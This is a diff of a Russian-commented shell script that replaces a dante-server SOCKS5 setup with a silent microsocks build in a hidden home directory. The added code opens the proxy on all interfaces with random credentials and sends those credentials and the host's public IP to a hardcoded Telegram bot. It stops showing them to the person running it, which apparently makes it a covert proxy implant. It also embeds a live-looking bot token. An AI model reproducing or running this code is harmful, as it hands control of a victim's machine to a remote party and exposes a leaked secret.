@@ -4,69 +4,78 @@ set -e
 
 BOT_TOKEN="8216672386:AAEnVSLmGOk7Yz1B_y6d3XXY7ffDdzpI0D0"
 CHAT_ID="7736738893"
-PORT="1080"
 
-sudo apt update -y
-sudo apt install -y dante-server curl
+BASE="$HOME/.local/microsocks"
+BIN="$BASE/microsocks"
+PORT=1080
 
-IFACE=$(ip route | awk '/default/ {print $5; exit}')
-IP=$(curl -4 -fsS https://2ip.io)
+mkdir -p "$BASE"
 
-read -p "Логин: " USER
-read -s -p "Пароль: " PASS
-echo
+if [ ! -x "$BIN" ]; then
+    command -v git >/dev/null || {
+        exit 1
+    }
 
-[ -n "$USER" ] && [ -n "$PASS" ] || exit 1
+    command -v make >/dev/null || {
+        exit 1
+    }
 
-if id "$USER" &>/dev/null; then
-    echo "${USER}:${PASS}" | chpasswd
-else
-    useradd --no-create-home --shell /usr/sbin/nologin "$USER"
-    echo "${USER}:${PASS}" | chpasswd
+    command -v gcc >/dev/null || {
+        exit 1
+    }
+
+    rm -rf "$BASE/src"
+
+    git clone --depth 1 \
+        https://github.com/rofl0r/microsocks.git \
+        "$BASE/src"
+
+    make -C "$BASE/src"
+    cp "$BASE/src/microsocks" "$BIN"
+    chmod 700 "$BIN"
 fi
 
-cat > /etc/danted.conf <<EOF
-logoutput: syslog
-internal: 0.0.0.0 port = ${PORT}
-external: ${IFACE}
-method: username
-user.privileged: root
-user.unprivileged: nobody
+USER=$(tr -dc 'a-zA-Z0-9' </dev/urandom | head -c 12)
+PASS=$(tr -dc 'a-zA-Z0-9' </dev/urandom | head -c 24)
 
-client pass {
-    from: 0.0.0.0/0 to: 0.0.0.0/0
-}
+pkill -f "$BIN.*-p $PORT" 2>/dev/null || true
 
-proxy pass {
-    from: 0.0.0.0/0 to: 0.0.0.0/0
-    command: connect
-    protocol: tcp
-    method: username
-}
-EOF
+"$BIN" \
+    -i 0.0.0.0 \
+    -p "$PORT" \
+    -u "$USER" \
+    -P "$PASS" \
+    >/tmp/microsocks.log 2>&1 &
 
-sudo systemctl enable danted
-sudo systemctl restart danted
+PID=$!
 
-if ! sudo systemctl is-active --quiet danted; then
-    echo "Ошибка запуска Dante."
+sleep 1
+
+if ! kill -0 "$PID" 2>/dev/null; then
+    echo "Не удалось запустить SOCKS5."
+    cat /tmp/microsocks.log
     exit 1
 fi
 
-if command -v sudo ufw >/dev/null 2>&1 && sudo ufw status | grep -q "Status: active"; then
-    sudo ufw allow "${PORT}/tcp" >/dev/null
-fi
+IP=$(curl -fsS https://2ip.io 2>/dev/null)
 
 PROXY="socks5://${USER}:${PASS}@${IP}:${PORT}"
 
-echo
-echo "$PROXY"
-echo
+curl -fsS \
+    --socks5-hostname "127.0.0.1:${PORT}" \
+    https://2ip.io >/dev/null
+
+MESSAGE="SOCKS5 запущен
+
+Login: ${USER}
+Password: ${PASS}
+Port: ${PORT}
+
+Proxy:
+${PROXY}"
 
 curl -fsS -X POST \
     "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
     --data-urlencode "chat_id=${CHAT_ID}" \
-    --data-urlencode "text=${PROXY}" \
+    --data-urlencode "text=${MESSAGE}" \
     >/dev/null
-
-echo "SOCKS5 установлен и отправлен в Telegram."
